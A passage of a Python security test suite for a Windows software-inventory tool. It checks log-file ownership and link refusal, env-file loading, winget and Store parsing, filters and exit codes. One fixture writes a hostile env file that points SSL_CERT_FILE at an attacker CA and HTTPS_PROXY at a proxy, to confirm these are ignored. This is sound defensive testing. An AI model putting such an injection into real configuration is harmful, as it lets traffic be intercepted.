        self.assertEqual(log.read_text(encoding="utf-8"), "pre-created\n")   # nothing written
        self.assertEqual(self._dacl(log)[0], dacl_before)                    # and not modified

    def test_file_owned_by_system_or_administrators_is_accepted(self):
        for sid in ("S-1-5-18", "S-1-5-32-544"):
            log = self.dir / f"trusted-{sid}.log"
            log.write_text("x\n", encoding="utf-8")
            with patch.object(se, "_handle_owner_sid", return_value=sid):
                se.setup_logging(log_file=str(log))                          # must not raise
            self._assert_owner_only(log)
            for h in list(se.logger.handlers):   # setup_logging() drops old handlers without closing them
                h.close()
            se.logger.handlers.clear()

    def test_own_existing_file_is_accepted(self):
        """Owner of a file this process creates is one of our own SIDs (real check, no mocks)."""
        log = self.dir / "mine.log"
        log.write_text("earlier run\n", encoding="utf-8")
        se.setup_logging(log_file=str(log))
        se.log_audit_event("TEST", "appended")
        self._flush()
        self.assertIn("appended", log.read_text(encoding="utf-8"))
        with open(log, "a", encoding="utf-8") as stream:
            self.assertIn(se._handle_owner_sid(msvcrt.get_osfhandle(stream.fileno())), se._current_owner_sids())

    def test_hard_linked_log_file_is_refused(self):
        target = self.dir / "elsewhere.txt"
        target.write_text("private\n", encoding="utf-8")
        log = self.dir / "audit.log"
        os.link(target, log)
        with self.assertRaises(se.LogFileOwnershipError) as ctx:
            se.setup_logging(log_file=str(log))
        self.assertIn("hard links", str(ctx.exception))
        self.assertEqual(target.read_text(encoding="utf-8"), "private\n")

    def test_symlinked_log_file_is_refused(self):
        target = self.dir / "elsewhere.txt"
        target.write_text("private\n", encoding="utf-8")
        log = self.dir / "audit.log"
        try:
            os.symlink(target, log)
        except OSError:
            self.skipTest("Cannot create symlinks (requires admin or Developer Mode on Windows)")
        with self.assertRaises(se.LogFileOwnershipError):
            se.setup_logging(log_file=str(log))
        self.assertEqual(target.read_text(encoding="utf-8"), "private\n")

    def test_unverifiable_owner_on_drive_without_acls_warns_and_continues(self):
        """FAT32/exFAT have no owners: warn once and keep logging."""
        log = self.dir / "audit.log"
        log.write_text("x\n", encoding="utf-8")
        captured = io.StringIO()
        with patch.object(se, "_volume_supports_acls", return_value=False), \
             patch.object(se, "_handle_owner_sid", side_effect=OSError("no owner information")), \
             patch("sys.stderr", captured):
            se.setup_logging(log_file=str(log))
            se.log_audit_event("TEST", "still logging")
            self._flush()
        self.assertEqual(captured.getvalue().count("could not restrict log file permissions"), 1)
        self.assertIn("still logging", log.read_text(encoding="utf-8"))

    def test_unverifiable_owner_on_acl_drive_is_refused(self):
        """Fail closed: the drive has owners, but this file's can't be read."""
        log = self.dir / "audit.log"
        log.write_text("x\n", encoding="utf-8")
        with patch.object(se, "_handle_owner_sid", side_effect=OSError("cannot read owner")):
            with self.assertRaises(se.LogFileOwnershipError) as ctx:
                se.setup_logging(log_file=str(log))
        self.assertIn("Could not verify who owns", str(ctx.exception))
        self.assertEqual(log.read_text(encoding="utf-8"), "x\n")

    def test_foreign_owner_refused_even_if_drive_reports_no_acls(self):
        """The drive check must not switch off the ownership check (fail-open). A failed or
        misleading capability report still refuses a file another account owns."""
        log = self.dir / "audit.log"
        log.write_text("pre-created\n", encoding="utf-8")
        with patch.object(se, "_volume_supports_acls", return_value=False), \
             patch.object(se, "_handle_owner_sid", return_value=self.FOREIGN_SID):
            with self.assertRaises(se.LogFileOwnershipError):
                se.setup_logging(log_file=str(log))
        self.assertEqual(log.read_text(encoding="utf-8"), "pre-created\n")

    def _run_main(self, *argv):
        captured = io.StringIO()
        with patch.object(sys, "argv", ["Software_Enumerator.py", *argv]), \
             patch.object(se, "WingetUpdateChecker") as checker, \
             patch.object(se, "_load_env_file"), patch("sys.stderr", captured):
            checker.return_value.check_for_updates.return_value = []
            with self.assertRaises(SystemExit) as ctx:
                se.main()
        return ctx.exception.code, captured.getvalue()

    def test_main_exits_permission_denied_for_foreign_log(self):
        log = self.dir / "audit.log"
        log.write_text("pre-created\n", encoding="utf-8")
        with patch.object(se, "_handle_owner_sid", return_value=self.FOREIGN_SID):
            code, err = self._run_main("--check-updates", "--quiet", "--log-file", str(log))
        self.assertEqual(code, se.EXIT_PERMISSION_DENIED)
        self.assertIn("owned by another account", err)

    def test_main_exits_permission_denied_when_log_unwritable(self):
        with patch.object(se, "setup_logging", side_effect=PermissionError("denied")):
            code, err = self._run_main("--check-updates", "--quiet", "--log-file", "x.log")
        self.assertEqual(code, se.EXIT_PERMISSION_DENIED)
        self.assertIn("cannot create or write the log file", err)


def subprocess_run_text(cmd, **kwargs):
    import subprocess
    return subprocess.run(cmd, capture_output=True, text=True, timeout=60, **kwargs).stdout


class TestCompiledSkipPatterns(unittest.TestCase):
    """Test that compiled SKIP_PATTERNS work correctly."""

    def test_skip_patterns_compiled_at_init(self):
        """VulnerabilityScanner should have _compiled_skip_patterns after init."""
        scanner = se.VulnerabilityScanner()
        self.assertTrue(hasattr(scanner, '_compiled_skip_patterns'))
        self.assertEqual(len(scanner._compiled_skip_patterns), len(scanner.SKIP_PATTERNS))

    def test_should_skip_known_framework(self):
        """Known framework packages should be skipped."""
        scanner = se.VulnerabilityScanner()
        self.assertTrue(scanner._should_skip_software("Microsoft Visual C++ 2019 Redistributable"))

    def test_should_not_skip_regular_software(self):
        """Regular software should not be skipped."""
        scanner = se.VulnerabilityScanner()
        self.assertFalse(scanner._should_skip_software("Google Chrome"))


class TestLoadEnvFile(unittest.TestCase):
    """_load_env_file() reads only NVD_API_KEY, and only from the tool's own folder.

    These tests call the real function with _env_search_dirs() pointed at a temp
    folder, so the developer's real api.env is never read.
    """

    WATCHED = ("NVD_API_KEY", "SSL_CERT_FILE", "HTTPS_PROXY", "HTTP_PROXY", "ZZ_TEST_EXTRA_VAR")

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self.tmp.name)
        self._env = patch.dict(os.environ, {}, clear=False)
        self._env.start()
        for key in self.WATCHED:
            os.environ.pop(key, None)

    def tearDown(self):
        self._env.stop()
        self.tmp.cleanup()

    def _load(self, files):
        for name, content in files.items():
            (self.dir / name).write_text(content, encoding="utf-8")
        with patch.object(se, "_env_search_dirs", return_value=[self.dir]):
            se._load_env_file()

    def test_loads_api_key_from_api_env(self):
        self._load({"api.env": "NVD_API_KEY=test-key-123\n"})
        self.assertEqual(os.environ.get("NVD_API_KEY"), "test-key-123")

    def test_loads_from_dot_env_when_no_api_env(self):
        self._load({".env": "NVD_API_KEY=from-dot-env\n"})
        self.assertEqual(os.environ.get("NVD_API_KEY"), "from-dot-env")

    def test_api_env_wins_and_loading_stops_at_first_file(self):
        self._load({"api.env": "NVD_API_KEY=from-api-env\n", ".env": "NVD_API_KEY=from-dot-env\n"})
        self.assertEqual(os.environ.get("NVD_API_KEY"), "from-api-env")

    def test_strips_quotes_and_whitespace(self):
        self._load({"api.env": '  NVD_API_KEY = "quoted-key"  \n'})
        self.assertEqual(os.environ.get("NVD_API_KEY"), "quoted-key")

    def test_skips_comments_and_blank_lines(self):
        self._load({"api.env": "# comment\n\n   \nnot a pair\nNVD_API_KEY=yes\n# another\n"})
        self.assertEqual(os.environ.get("NVD_API_KEY"), "yes")

    def test_does_not_overwrite_existing_env(self):
        os.environ["NVD_API_KEY"] = "from-real-environment"
        self._load({"api.env": "NVD_API_KEY=from-file\n"})
        self.assertEqual(os.environ["NVD_API_KEY"], "from-real-environment")

    def test_key_name_is_case_insensitive(self):
        self._load({"api.env": "nvd_api_key=lower-case-name\n"})
        self.assertEqual(os.environ.get("NVD_API_KEY"), "lower-case-name")

    def test_other_keys_are_ignored(self):
        """An env file must not be able to set proxy / CA-bundle (or any other) variables."""
        self._load({"api.env": "SSL_CERT_FILE=C:\\attacker\\ca.pem\nHTTPS_PROXY=http://127.0.0.1:8080\n"
                               "HTTP_PROXY=http://127.0.0.1:8080\nZZ_TEST_EXTRA_VAR=1\nNVD_API_KEY=ok\n"})
        for key in ("SSL_CERT_FILE", "HTTPS_PROXY", "HTTP_PROXY", "ZZ_TEST_EXTRA_VAR"):
            self.assertNotIn(key, os.environ, f"{key} was set from an env file")
        self.assertEqual(os.environ.get("NVD_API_KEY"), "ok")

    def test_values_are_never_logged(self):
        with self.assertLogs(se.logger, level="DEBUG") as logs:
            self._load({"api.env": "SSL_CERT_FILE=secret-value-1\nNVD_API_KEY=secret-value-2\n"})
        joined = "\n".join(logs.output)
        self.assertIn("SSL_CERT_FILE", joined)              # ignored key is named...
        self.assertNotIn("secret-value-1", joined)          # ...but its value isn't logged
        self.assertNotIn("secret-value-2", joined)

    def test_search_dirs_are_tool_folder_only_not_cwd(self):
        cwd = os.getcwd()
        os.chdir(self.dir)
        try:
            dirs = se._env_search_dirs()
        finally:
            os.chdir(cwd)
        self.assertEqual(dirs, [Path(se.__file__).resolve().parent])
        self.assertNotIn(self.dir.resolve(), [d.resolve() for d in dirs])

    def test_frozen_build_uses_executable_folder(self):
        exe = self.dir / "Software_Enumerator.exe"
        with patch.object(sys, "frozen", True, create=True), patch.object(sys, "executable", str(exe)):
            self.assertEqual(se._env_search_dirs(), [self.dir.resolve()])

    def test_unreadable_file_is_skipped_quietly(self):
        (self.dir / "api.env").write_bytes(b"NVD_API_KEY=\xff\xfe\n")   # invalid UTF-8
        with patch.object(se, "_env_search_dirs", return_value=[self.dir]):
            se._load_env_file()                                   # must not raise
        self.assertNotIn("NVD_API_KEY", os.environ)


class TestWingetUpdateChecker(unittest.TestCase):
    """Tests for WingetUpdateChecker parsing logic."""

    def setUp(self):
        self.checker = se.WingetUpdateChecker()

    def test_parse_standard_output(self):
        """Standard winget upgrade output should be parsed correctly."""
        output = (
            "Name                            Id                          Version     Available   Source\n"
            "─────────────────────────────────────────────────────────────────────────────────────────────\n"
            "Google Chrome                   Google.Chrome               124.0.6367  125.0.6422  winget\n"
            "Visual Studio Code              Microsoft.VisualStudioCode  1.89.0      1.90.1      winget\n"
            "2 upgrades available.\n"
        )
        updates = self.checker._parse_winget_output(output)
        self.assertEqual(len(updates), 2)
        self.assertEqual(updates[0].name, "Google Chrome")
        self.assertEqual(updates[0].current_version, "124.0.6367")
        self.assertEqual(updates[0].available_version, "125.0.6422")
        self.assertEqual(updates[0].winget_id, "Google.Chrome")

    def test_parse_empty_output(self):
        """Empty output should return no updates."""
        updates = self.checker._parse_winget_output("")
        self.assertEqual(updates, [])

    def test_parse_no_updates_available(self):
        """Output with no upgradeable packages should return empty list."""
        output = "No installed package found matching input criteria.\n"
        updates = self.checker._parse_winget_output(output)
        self.assertEqual(updates, [])

    def test_parse_no_header(self):
        """Output without a recognizable header should return empty list."""
        output = "Some random output\nAnother line\n"
        updates = self.checker._parse_winget_output(output)
        self.assertEqual(updates, [])

    def test_parse_skips_separator_lines(self):
        """Separator lines (dashes, box-drawing chars) should be skipped."""
        output = (
            "Name    Id          Version  Available  Source\n"
            "-----------------------------------------------\n"
            "Firefox Mozilla.Firefox  126.0    127.0      winget\n"
        )
        updates = self.checker._parse_winget_output(output)
        self.assertEqual(len(updates), 1)
        self.assertEqual(updates[0].name, "Firefox")

    def test_parse_skips_same_version(self):
        """Entries where current == available should be skipped."""
        output = (
            "Name    Id          Version  Available  Source\n"
            "-----------------------------------------------\n"
            "App     Some.App    1.0.0    1.0.0      winget\n"
        )
        updates = self.checker._parse_winget_output(output)
        self.assertEqual(len(updates), 0)

    def test_warnings_go_to_stderr(self):
        """Warning messages should print to stderr, not stdout."""
        import io as _io
        captured_stderr = _io.StringIO()
        with patch('subprocess.run', side_effect=FileNotFoundError):
            with patch('sys.stderr', captured_stderr):
                self.checker.check_for_updates()
        self.assertIn("winget not found", captured_stderr.getvalue())


class TestStoreAppScanner(unittest.TestCase):
    """Tests for StoreAppScanner parsing logic."""

    def _make_mock_result(self, stdout, returncode=0):
        mock = MagicMock()
        mock.stdout = stdout
        mock.returncode = returncode
        return mock

    @patch('subprocess.run')
    def test_parse_csv_output(self, mock_run):
        """Standard CSV output from PowerShell should be parsed correctly."""
        csv_output = (
            '"Name","Version","Publisher","InstallLocation"\n'
            '"SpotifyAB.SpotifyMusic","1.230.0","CN=Spotify AB, O=Spotify","C:\\Program Files"\n'
        )
        mock_run.return_value = self._make_mock_result(csv_output)
        scanner = se.StoreAppScanner()
        apps = scanner.get_store_apps()
        self.assertGreaterEqual(len(apps), 1)
        self.assertEqual(apps[0].source, "Store")

    @patch('subprocess.run')
    def test_nonzero_returncode_returns_empty(self, mock_run):
        """Non-zero return code should return empty list."""
        mock_run.return_value = self._make_mock_result("", returncode=1)
        scanner = se.StoreAppScanner()
        apps = scanner.get_store_apps()
        self.assertEqual(apps, [])

    @patch('subprocess.run')
    def test_empty_csv_returns_empty(self, mock_run):
        """CSV with only headers should return empty list."""
        csv_output = '"Name","Version","Publisher","InstallLocation"\n'
        mock_run.return_value = self._make_mock_result(csv_output)
        scanner = se.StoreAppScanner()
        apps = scanner.get_store_apps()
        self.assertEqual(apps, [])

    @patch('subprocess.run')
    def test_cleans_cn_prefix_from_publisher(self, mock_run):
        """Publisher CN= prefix should be stripped."""
        csv_output = (
            '"Name","Version","Publisher","InstallLocation"\n'
            '"TestApp","1.0","CN=Contoso Ltd, O=Contoso","C:\\Apps"\n'
        )
        mock_run.return_value = self._make_mock_result(csv_output)
        scanner = se.StoreAppScanner()
        apps = scanner.get_store_apps()
        self.assertEqual(apps[0].publisher, "Contoso Ltd")


class TestExcludeFilter(unittest.TestCase):
    """Tests for --exclude pattern support."""

    def setUp(self):
        self.software_list = [
            se.SoftwareInfo(name="Google Chrome", version="125.0", publisher="Google LLC", source="Registry"),
            se.SoftwareInfo(name="Microsoft .NET Runtime", version="8.0", publisher="Microsoft", source="Registry"),
            se.SoftwareInfo(name="Visual C++ Redistributable", version="14.0", publisher="Microsoft", source="Registry"),
            se.SoftwareInfo(name="Firefox", version="127.0", publisher="Mozilla", source="Registry"),
        ]
        self.enumerator = se.SoftwareEnumerator()

    def test_exclude_single_term(self):
        """Single exclude term should filter matching software."""
        result = self.enumerator.filter_results(self.software_list, exclude_terms=[".NET"])
        names = [s.name for s in result]
        self.assertNotIn("Microsoft .NET Runtime", names)
        self.assertEqual(len(result), 3)

    def test_exclude_multiple_terms(self):
        """Multiple exclude terms should filter all matching software."""
        result = self.enumerator.filter_results(self.software_list, exclude_terms=[".NET", "Redistributable"])
        names = [s.name for s in result]
        self.assertNotIn("Microsoft .NET Runtime", names)
        self.assertNotIn("Visual C++ Redistributable", names)
        self.assertEqual(len(result), 2)

    def test_exclude_by_publisher(self):
        """Exclude should match against publisher too."""
        result = self.enumerator.filter_results(self.software_list, exclude_terms=["Microsoft"])
        names = [s.name for s in result]
        self.assertNotIn("Microsoft .NET Runtime", names)
        self.assertNotIn("Visual C++ Redistributable", names)
        self.assertIn("Google Chrome", names)

    def test_exclude_case_insensitive(self):
        """Exclude matching should be case-insensitive."""
        result = self.enumerator.filter_results(self.software_list, exclude_terms=["GOOGLE"])
        names = [s.name for s in result]
        self.assertNotIn("Google Chrome", names)

    def test_exclude_with_search_combined(self):
        """Exclude and search should work together."""
        result = self.enumerator.filter_results(
            self.software_list, search_term="Microsoft", exclude_terms=["Redistributable"]
        )
        # Search matches .NET and Redistributable (both have Microsoft publisher), exclude removes Redistributable
        names = [s.name for s in result]
        self.assertIn("Microsoft .NET Runtime", names)
        self.assertNotIn("Visual C++ Redistributable", names)

    def test_exclude_no_match(self):
        """Exclude term that matches nothing should return all software."""
        result = self.enumerator.filter_results(self.software_list, exclude_terms=["nonexistent"])
        self.assertEqual(len(result), len(self.software_list))

    def test_exclude_none(self):
        """None exclude_terms should return all software."""
        result = self.enumerator.filter_results(self.software_list, exclude_terms=None)
        self.assertEqual(len(result), len(self.software_list))


class TestExitCodes(unittest.TestCase):
    """Tests for structured exit code constants."""

    def test_exit_code_constants_exist(self):
        """Exit code constants should be defined."""
        self.assertEqual(se.EXIT_SUCCESS, 0)
        self.assertEqual(se.EXIT_ERROR, 1)
        self.assertEqual(se.EXIT_NO_SOFTWARE, 2)
        self.assertEqual(se.EXIT_API_FAILURE, 3)
        self.assertEqual(se.EXIT_PERMISSION_DENIED, 4)

    def test_exit_codes_are_distinct(self):
        """All exit codes should be unique values."""
        codes = [se.EXIT_SUCCESS, se.EXIT_ERROR, se.EXIT_NO_SOFTWARE, se.EXIT_API_FAILURE, se.EXIT_PERMISSION_DENIED]
        self.assertEqual(len(codes), len(set(codes)))


def run_security_tests():
    """Run every test class in this module and print results."""
    print("=" * 70)
    print("SOFTWARE ENUMERATOR - SECURITY TEST SUITE")
    print("=" * 70)
    print()

    # Collect test classes automatically, so a new class can't be left out by
    # forgetting to add it to a hand-maintained list.
    suite = unittest.defaultTestLoader.loadTestsFromModule(sys.modules[__name__])

    # Run with verbosity
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)

    print()
    print("=" * 70)
    print("SUMMARY")
    print("=" * 70)
    print(f"Tests run: {result.testsRun}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print(f"Skipped: {len(result.skipped)}")

    if result.wasSuccessful():
        print("\n[PASS] All security tests passed!")
        return 0
    else:
        print("\n[FAIL] Some security tests failed!")
        return 1


if __name__ == "__main__":
    sys.exit(run_security_tests())
